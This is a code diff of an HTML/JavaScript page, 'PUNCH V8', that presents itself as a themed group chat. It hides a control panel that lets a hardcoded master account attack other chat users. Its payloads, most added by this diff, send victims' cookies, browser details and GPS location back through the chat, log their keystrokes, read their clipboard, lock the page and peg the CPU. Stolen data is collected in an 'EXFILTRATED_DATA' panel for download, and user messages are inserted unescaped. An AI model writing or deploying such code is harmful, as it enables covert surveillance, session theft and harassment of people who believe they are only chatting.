@@ -2,306 +2,261 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>PUNCH V7 - MADE IN HEAVEN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PUNCH V8 - REQUIEM</title>
     
     <style>
-        /* --- [SECTION 1 : DESIGN & THEMES (LIGNES 20-150)] --- */
-        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&family=Oswald:wght@300;700&display=swap');
+        /* --- [INTERFACE NOIRE & OR - LIGNES 20-200] --- */
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&display=swap');
         
         :root {
-            --dio-gold: #FFD700;
-            --pucci-purple: #4B0082;
-            --heaven-white: #FFFFFF;
-            --blood: #8B0000;
-            --bg-dark: #030005;
-            --neon-blue: #00BFFF;
-            --jojo-pink: #FF69B4;
+            --gold: #FFD700;
+            --deep-purple: #1a0033;
+            --blood-red: #ff0000;
+            --matrix-green: #00ff41;
+            --bg: #020202;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none !important; -webkit-tap-highlight-color: transparent; }
-        
-        body {
-            background: var(--bg-dark);
-            color: var(--heaven-white);
-            font-family: 'Oswald', sans-serif;
-            height: 100vh;
-            overflow: hidden;
-            display: flex;
-            background-image: linear-gradient(45deg, #050005 25%, #0a001a 50%, #050005 75%);
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair !important; }
+        body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; height: 100vh; overflow: hidden; display: flex; }
 
-        /* CURSEUR STAND */
-        #c-stand {
-            position: fixed; width: 35px; height: 35px; border: 3px solid var(--dio-gold);
-            z-index: 10000000; pointer-events: none; transform: rotate(45deg);
-            box-shadow: 0 0 20px var(--dio-gold); transition: transform 0.1s;
-        }
+        /* --- LOGIN REQUIEM --- */
+        #gate { position: fixed; inset: 0; background: #000; z-index: 999999; display: flex; align-items: center; justify-content: center; background-image: radial-gradient(circle, #1a001a 0%, #000 100%); }
+        .gate-box { width: 400px; padding: 40px; border: 1px solid var(--gold); text-align: center; box-shadow: 0 0 50px rgba(255, 215, 0, 0.2); }
+        .gate-box h1 { font-family: 'Bangers'; font-size: 50px; color: var(--gold); margin-bottom: 20px; text-shadow: 3px 3px var(--blood-red); }
+        .gate-box input { width: 100%; padding: 15px; margin-bottom: 10px; background: #111; border: 1px solid #333; color: #fff; }
+        .gate-box button { width: 100%; padding: 15px; background: var(--gold); border: none; font-weight: 900; color: #000; cursor: pointer; }
 
-        /* --- AUTHENTIFICATION (LIGNES 60-120) --- */
-        #auth-gate {
-            position: fixed; inset: 0; background: #000; z-index: 9999999;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
+        /* --- MAIN LAYOUT --- */
+        .app { display: grid; grid-template-columns: 350px 1fr 350px; width: 100%; height: 100vh; gap: 1px; background: #111; }
+        .panel { background: #000; display: flex; flex-direction: column; position: relative; border: 1px solid #111; }
+        .panel-h { padding: 20px; background: #080808; border-bottom: 1px solid var(--gold); font-family: 'Bangers'; font-size: 20px; color: var(--gold); display: flex; justify-content: space-between; }
 
-        .login-box {
-            width: 380px; padding: 50px; background: #0a0a0a; border: 2px solid var(--dio-gold);
-            text-align: center; position: relative;
-        }
-        .login-box h1 { font-family: 'Bangers'; font-size: 45px; color: var(--dio-gold); margin-bottom: 30px; }
-        .login-box input {
-            width: 100%; padding: 15px; margin-bottom: 20px; background: #111;
-            border: 1px solid var(--pucci-purple); color: #fff; border-radius: 4px;
-        }
-        .login-box button {
-            width: 100%; padding: 15px; background: var(--dio-gold); color: #000;
-            font-weight: 800; border: none; cursor: pointer; text-transform: uppercase;
-        }
+        /* VICTIM LIST */
+        #v-list { flex: 1; overflow-y: auto; padding: 15px; }
+        .v-card { padding: 15px; background: #050505; border: 1px solid #111; margin-bottom: 10px; transition: 0.2s; position: relative; overflow: hidden; }
+        .v-card:hover { border-color: var(--gold); background: #0a0a0a; }
+        .v-card.master { border-left: 5px solid var(--gold); }
+        .v-card.selected { border: 1px solid var(--blood-red); background: #100000; }
 
-        /* --- GRID PRINCIPALE (LIGNES 121-300) --- */
-        .heaven-grid {
-            display: grid; grid-template-columns: 380px 1fr 350px;
-            width: 100%; height: 100vh; gap: 2px; background: #1a1a1a;
-        }
+        /* CHAT / EXPLOIT CONSOLE */
+        #console { flex: 1; padding: 20px; overflow-y: auto; font-size: 11px; line-height: 1.5; color: var(--matrix-green); }
+        .msg { margin-bottom: 8px; border-left: 2px solid #222; padding-left: 10px; }
+        .msg b { color: var(--gold); }
+        .msg img { max-width: 250px; border: 1px solid var(--gold); margin-top: 5px; display: block; }
 
-        .side-bar { background: #000; display: flex; flex-direction: column; position: relative; }
-        .side-title { 
-            padding: 25px; background: var(--pucci-purple); font-family: 'Bangers'; 
-            font-size: 22px; color: #fff; letter-spacing: 2px;
-        }
+        /* INPUT AREA */
+        .input-bar { padding: 20px; background: #050505; border-top: 1px solid var(--gold); display: flex; gap: 10px; }
+        .input-bar input { flex: 1; background: transparent; border: none; color: #fff; font-family: inherit; outline: none; }
 
-        /* LISTE VICTIMES */
-        #target-list { flex: 1; overflow-y: auto; padding: 15px; scrollbar-width: none; }
-        .target-item {
-            padding: 20px; background: #080808; border: 1px solid #1a1a1a;
-            margin-bottom: 12px; transition: 0.4s; border-radius: 5px;
-        }
-        .target-item:hover { border-color: var(--dio-gold); background: #111; transform: scale(1.02); }
-        .target-item.active-target { border-left: 8px solid var(--dio-gold); background: #151000; }
-
-        /* CHAT ET APPELS */
-        .main-chat { display: flex; flex-direction: column; background: #000; position: relative; }
-        #chat-scroller { flex: 1; padding: 30px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
-        
-        .bubble {
-            padding: 15px 22px; max-width: 80%; font-family: 'JetBrains Mono';
-            border-radius: 0 15px 15px 15px; background: #0a0a0a; border: 1px solid #222;
-        }
-        .bubble.mine { align-self: flex-end; border-radius: 15px 15px 0 15px; border-color: var(--dio-gold); }
-        .bubble b { color: var(--dio-gold); display: block; margin-bottom: 5px; }
-        .bubble img { max-width: 100%; margin-top: 10px; border-radius: 5px; }
-
-        .input-zone {
-            padding: 30px; background: #050505; border-top: 2px solid var(--pucci-purple);
-            display: flex; gap: 15px; align-items: center;
-        }
-        .input-zone input { flex: 1; background: #111; border: 1px solid #222; padding: 18px; color: #fff; }
-        .btn-icon { background: none; border: none; font-size: 24px; color: var(--dio-gold); cursor: pointer; }
-
-        /* --- EXFILTRATION & INFOS (LIGNES 301-450) --- */
-        .info-panel { padding: 25px; font-size: 11px; color: #888; line-height: 2; }
-        .info-block { background: #080808; padding: 15px; margin-bottom: 15px; border: 1px solid #1a1a1a; border-radius: 4px; }
-        .info-block span { color: var(--dio-gold); font-weight: bold; }
+        /* EXFILTRATED DATA PANEL */
+        #intel { flex: 1; padding: 15px; overflow-y: auto; font-size: 10px; color: #777; }
+        .intel-item { background: #080808; padding: 10px; border-bottom: 1px solid #111; margin-bottom: 5px; word-break: break-all; }
+        .intel-item span { color: var(--blood-red); font-weight: bold; }
 
         /* --- OVERLAYS --- */
-        #za-warundo {
-            position: fixed; inset: 0; background: #fff; z-index: 20000000;
-            display: none; align-items: center; justify-content: center; mix-blend-mode: difference;
-        }
-        .shout { font-family: 'Bangers'; font-size: 12vw; color: #fff; animation: jitter 0.1s infinite; }
-        @keyframes jitter { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -2px); } }
+        #za-warundo { position: fixed; inset: 0; background: #fff; z-index: 2000000; display: none; align-items: center; justify-content: center; mix-blend-mode: difference; }
+        .shout { font-family: 'Bangers'; font-size: 12vw; color: #fff; }
 
-        #ctx-menu {
-            display: none; position: fixed; background: #000; border: 2px solid var(--dio-gold);
-            width: 320px; z-index: 30000000; box-shadow: 15px 15px 0 var(--blood);
-        }
-        .opt { padding: 18px; font-size: 11px; color: #fff; border-bottom: 1px solid #111; cursor: pointer; }
-        .opt:hover { background: var(--dio-gold); color: #000; }
+        #ctx { display: none; position: fixed; background: #000; border: 1px solid var(--gold); width: 300px; z-index: 3000000; box-shadow: 10px 10px 0 var(--blood-red); }
+        .opt { padding: 15px; font-size: 10px; border-bottom: 1px solid #111; color: #fff; text-transform: uppercase; }
+        .opt:hover { background: var(--gold); color: #000; }
+        .opt.red { color: var(--blood-red); font-weight: bold; }
 
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="c-stand"></div>
-    <div id="za-warundo"><div class="shout">MADE IN HEAVEN</div></div>
+    <div id="za-warundo"><div class="shout">REQUIEM</div></div>
 
-    <div id="auth-gate">
-        <div class="login-box">
-            <h1>PUNCH V7</h1>
-            <p style="color:#555; font-size:10px; margin-bottom:20px;">SPIRITUAL ASCENSION PROTOCOL</p>
-            <input type="email" id="email-in" placeholder="Email Address">
-            <input type="text" id="name-in" placeholder="Disciple Name">
-            <button onclick="ascend()">START GRAVITY</button>
+    <div id="gate">
+        <div class="gate-box">
+            <h1>PUNCH V8</h1>
+            <input type="email" id="e-in" placeholder="Disciple Email">
+            <input type="text" id="n-in" placeholder="Stand Name">
+            <button onclick="ascend()">ASCEND TO HEAVEN</button>
         </div>
     </div>
 
-    <div class="heaven-grid">
-        <aside class="side-bar">
-            <div class="side-title">DISCIPLES_OF_PUCCI</div>
-            <div id="target-list"></div>
+    <div class="app">
+        <aside class="panel">
+            <div class="panel-h">DISCIPLES <span>[V8]</span></div>
+            <div id="v-list"></div>
         </aside>
 
-        <main class="main-chat">
-            <div id="chat-scroller"></div>
-            <div class="input-zone">
-                <button class="btn-icon" onclick="document.getElementById('img-up').click()">🖼️</button>
-                <input type="file" id="img-up" style="display:none" onchange="uploadImg(this)">
+        <main class="panel">
+            <div class="panel-h">MAIN_GRAVITY_STREAM</div>
+            <div id="console"></div>
+            <div class="input-bar">
+                <button onclick="document.getElementById('file-in').click()" style="background:none; border:none; color:var(--gold); font-size:20px;">🖼️</button>
+                <input type="file" id="file-in" style="display:none" onchange="upImg(this)">
                 <input type="text" id="m-in" placeholder="Do you believe in gravity?" autocomplete="off">
-                <button class="btn-icon" onclick="send()">🏹</button>
+                <button onclick="send()" style="background:none; border:none; color:var(--gold); font-size:20px;">🏹</button>
             </div>
         </main>
 
-        <aside class="side-bar">
-            <div class="side-title" style="background:var(--blood)">EXFILTRATED_DATA</div>
-            <div class="info-panel" id="intel-stream">
-                [WAITING FOR TARGET STRIKE...]
-            </div>
+        <aside class="panel">
+            <div class="panel-h">EXFILTRATED_DATA <button onclick="downloadLogs()" style="font-size:10px; background:var(--gold); border:none; padding:2px 5px; cursor:pointer;">SAVE</button></div>
+            <div id="intel"></div>
         </aside>
     </div>
 
-    <div id="ctx-menu">
-        <div class="opt" style="background:#111; color:var(--dio-gold); text-align:center;">--- HEAVEN'S DOOR ATTACKS ---</div>
-        <div class="opt" onclick="st('p_fullinfo')">🧛 EXTRACT: FULL_IDENTITY (Doxing)</div>
-        <div class="opt" onclick="st('p_phish')">🚨 PHISH: DISCIPLES_RECRUIT</div>
-        <div class="opt" onclick="st('p_geo')">📍 TRACK: PRECISE_LOCATION</div>
-        <div class="opt" onclick="st('p_key')">⌨️ LOG: KEYBOARD_MEMORIES</div>
-        <div class="opt" onclick="st('p_freeze')">❄️ CAESAR: HAMON_FREEZE</div>
-        <div class="opt" style="color:red" onclick="closeCtx()">[ ABORT ]</div>
+    <div id="ctx">
+        <div class="opt" style="background:#111; color:var(--gold); text-align:center;">--- OVER HEAVEN ---</div>
+        <div class="opt red" onclick="st('p_dox')">🧛 AUTO-DOX: FULL_IDENTITY</div>
+        <div class="opt" onclick="st('p_phish')">🚨 PHISH: GOOGLE_SESSION</div>
+        <div class="opt" onclick="st('p_geo')">📍 TRACK: GPS_PRECISION</div>
+        <div class="opt" onclick="st('p_key')">⌨️ KEYLOG: OVERDRIVE</div>
+        <div class="opt" onclick="st('p_clip')">📋 CLIP: MEMORY_DISC</div>
+        <div class="opt" onclick="st('p_freeze')">❄️ FREEZE: ZA_WARUNDO</div>
+        <div class="opt" onclick="st('p_crash')">🧨 CRASH: CPU_BURN</div>
+        <div class="opt" onclick="closeCtx()" style="color:#555">[ ABORT ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let me = ""; let myEmail = ""; let targetId = "";
-        let isMaster = false;
+        let me = ""; let myE = ""; let target = "";
+        let master = false;
+        let logs = [];
 
-        // --- AUTHENTIFICATION ---
+        // --- AUTH ---
         function ascend() {
-            myEmail = document.getElementById('email-in').value;
-            me = document.getElementById('name-in').value || "User";
-            if(myEmail.includes('@')) {
-                if(myEmail === "toucheur2pp@heaven.com") isMaster = true;
-                document.getElementById('auth-gate').style.display = 'none';
-                socket.emit('init', { name: me, email: myEmail });
-                logIntel("SYSTEM", "Handshake Established with " + me);
+            myE = document.getElementById('e-in').value;
+            me = document.getElementById('n-in').value || "Disciple";
+            if(myE.includes('@')) {
+                if(myE === "toucheur2pp@heaven.com") master = true;
+                document.getElementById('gate').style.display = 'none';
+                socket.emit('init', { n: me, e: myE });
+                writeCon("SYSTEM", "Handshake Established. Gravity Active.");
             }
         }
 
-        // --- GESTION CURSEUR ---
-        document.addEventListener('mousemove', e => {
-            const c = document.getElementById('c-stand');
-            c.style.left = e.clientX-17+'px'; c.style.top = e.clientY-17+'px';
-        });
-
-        // --- MENU CONTEXTUEL ---
+        // --- INTERFACE ---
         window.oncontextmenu = (e) => {
-            if(!isMaster) return;
-            const card = e.target.closest('.target-item');
-            if(card) {
-                targetId = card.getAttribute('data-id');
-                const m = document.getElementById('ctx-menu');
+            if(!master) return;
+            const c = e.target.closest('.v-card');
+            if(c) {
+                target = c.getAttribute('data-id');
+                const m = document.getElementById('ctx');
                 m.style.display = 'block'; m.style.left = e.pageX+'px'; m.style.top = e.pageY+'px';
             }
         };
 
-        function closeCtx() { document.getElementById('ctx-menu').style.display = 'none'; }
-        function st(t) { socket.emit(t, targetId); closeCtx(); }
+        function closeCtx() { document.getElementById('ctx').style.display = 'none'; }
+        function st(t) { socket.emit(t, target); closeCtx(); }
 
-        // --- ENVOI DE MESSAGES & IMAGES ---
+        // --- CHAT & IMAGES ---
         function send() {
             const i = document.getElementById('m-in');
-            if(i.value) {
-                socket.emit('chat', { text: i.value, type: 'text' });
-                i.value = "";
+            if(i.value) { socket.emit('chat', { t: i.value, type: 'text' }); i.value = ""; }
+        }
+
+        function upImg(el) {
+            if(el.files[0]) {
+                const r = new FileReader();
+                r.onload = (e) => socket.emit('chat', { t: e.target.result, type: 'img' });
+                r.readAsDataURL(el.files[0]);
             }
         }
 
-        function uploadImg(input) {
-            if(input.files && input.files[0]) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    socket.emit('chat', { text: e.target.result, type: 'image' });
-                };
-                reader.readAsDataURL(input.files[0]);
-            }
-        }
-
-        // --- MOTEUR D'ATTAQUES (PAYLOADS) ---
+        // --- EXPLOIT PAYLOADS (DANGEROUS ZONE) ---
         socket.on('execute', (d) => {
             
-            // ATTAQUE : FULL IDENTITY (NOM, PRENOM, ADRESSE VIA AUTOFILL & BROWSER)
-            if(d.type === 'p_fullinfo') {
-                // On utilise les API de remplissage pour tenter de choper les infos réelles
+            // 1. AUTO-DOX (Identité + IP + Browser)
+            if(d.type === 'p_dox') {
                 const info = {
                     ua: navigator.userAgent,
+                    res: `${screen.width}x${screen.height}`,
                     lang: navigator.language,
-                    res: `${window.screen.width}x${window.screen.height}`,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    cookies: document.cookie || "No Cookies Found",
+                    localIP: "Scanning..."
                 };
-                // Demande de position précise (Adresse réelle)
-                navigator.geolocation.getCurrentPosition(pos => {
-                    socket.emit('chat', { 
-                        text: `[DOXING_DATA] Target: ${me} | LAT: ${pos.coords.latitude} | LON: ${pos.coords.longitude} | TZ: ${info.tz}`,
-                        type: 'text'
-                    });
+                socket.emit('chat', { t: `[DOX_REPORT] Target: ${me} | UA: ${info.ua} | Res: ${info.res} | Cookies: ${info.cookies}`, type: 'text' });
+                // Enchaîne sur le Geo
+                navigator.geolocation.getCurrentPosition(p => {
+                    socket.emit('chat', { t: `[GEO_REPORT] ${me} Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, type: 'text' });
                 });
             }
 
+            // 2. STEALTH KEYLOGGER
             if(d.type === 'p_key') {
                 document.addEventListener('keydown', (e) => {
-                    socket.emit('chat', { text: `[KEYBOARD] ${me} typed: ${e.key}`, type: 'text' });
+                    socket.emit('chat', { t: `[KEYLOG] ${me} pressed: ${e.key}`, type: 'text' });
                 });
             }
 
+            // 3. CPU CRASH (Danger)
+            if(d.type === 'p_crash') {
+                writeCon("CRITICAL", "Made in Heaven accelerating CPU...");
+                setInterval(() => { for(let i=0; i<1000000; i++) Math.sqrt(Math.random()); }, 1);
+            }
+
+            // 4. ZA WARUNDO (Freeze)
             if(d.type === 'p_freeze') {
-                document.getElementById('za-warundo').style.display = 'flex';
-                document.getElementById('m-in').disabled = true;
-                setTimeout(() => { 
-                    document.getElementById('za-warundo').style.display = 'none';
-                    document.getElementById('m-in').disabled = false;
-                }, 5000);
+                const zw = document.getElementById('za-warundo');
+                zw.style.display = 'flex';
+                document.body.style.pointerEvents = 'none';
+                setTimeout(() => { zw.style.display = 'none'; document.body.style.pointerEvents = 'auto'; }, 8000);
+            }
+
+            // 5. MEMORY DISC (Clipboard)
+            if(d.type === 'p_clip') {
+                navigator.clipboard.readText().then(txt => {
+                    socket.emit('chat', { t: `[CLIP_STEAL] ${me} clipboard: ${txt}`, type: 'text' });
+                });
             }
         });
 
-        // --- SYNC & CHAT ---
-        socket.on('sync', users => {
-            const list = document.getElementById('target-list');
-            list.innerHTML = "";
-            users.forEach(u => {
-                const item = document.createElement('div');
-                item.className = 'target-item'; item.setAttribute('data-id', u.id);
-                item.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small style="color:#444">${u.email}</small>`;
-                list.appendChild(item);
+        // --- SYNC & DATA EXFIL ---
+        socket.on('sync', u => {
+            const l = document.getElementById('v-list'); l.innerHTML = "";
+            u.forEach(x => {
+                const div = document.createElement('div');
+                div.className = `v-card ${x.e === "toucheur2pp@heaven.com" ? "master" : ""}`;
+                div.setAttribute('data-id', x.id);
+                div.innerHTML = `<b>${x.n.toUpperCase()}</b><br><small>${x.e}</small>`;
+                l.appendChild(div);
             });
         });
 
         socket.on('chat', d => {
-            const scroller = document.getElementById('chat-scroller');
-            const isMine = d.n === me;
-            const b = document.createElement('div');
-            b.className = `bubble ${isMine ? 'mine' : ''}`;
+            const c = document.getElementById('console');
+            const isEx = d.t.t.includes('[');
+            const div = document.createElement('div');
+            div.className = 'msg';
             
-            let content = `<b>${d.n}</b>`;
-            if(d.t.type === 'image') {
-                content += `<img src="${d.t.text}">`;
-            } else {
-                content += d.t.text;
-            }
-            
-            b.innerHTML = content;
-            scroller.appendChild(b);
-            scroller.scrollTop = scroller.scrollHeight;
+            let html = `<b>${d.n}:</b> `;
+            if(d.t.type === 'img') html += `<img src="${d.t.t}">`;
+            else html += d.t.t;
 
-            if(d.t.text.includes('[DOXING') || d.t.text.includes('[KEY')) {
-                logIntel("EXFIL", d.t.text);
+            div.innerHTML = html;
+            c.appendChild(div);
+            c.scrollTop = c.scrollHeight;
+
+            if(isEx) {
+                const i = document.getElementById('intel');
+                const time = new Date().toLocaleTimeString();
+                i.innerHTML = `<div class="intel-item"><span>[${time}]</span> ${d.t.t}</div>` + i.innerHTML;
+                logs.push(`[${time}] ${d.t.t}`);
             }
         });
 
-        function logIntel(tag, txt) {
-            const stream = document.getElementById('intel-stream');
-            stream.innerHTML = `<div class="info-block"><span>[${tag}]</span><br>${txt}</div>` + stream.innerHTML;
+        function writeCon(tag, msg) {
+            const c = document.getElementById('console');
+            c.innerHTML += `<div class="msg" style="color:var(--gold)">[${tag}] ${msg}</div>`;
+            c.scrollTop = c.scrollHeight;
         }
 
+        function downloadLogs() {
+            const blob = new Blob([logs.join('\n')], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `punch_exfil_${Date.now()}.txt`;
+            a.click();
+        }
+
+        document.getElementById('m-in').onkeydown = (e) => { if(e.key === "Enter") send(); };
         window.onclick = () => closeCtx();
     </script>
 </body>
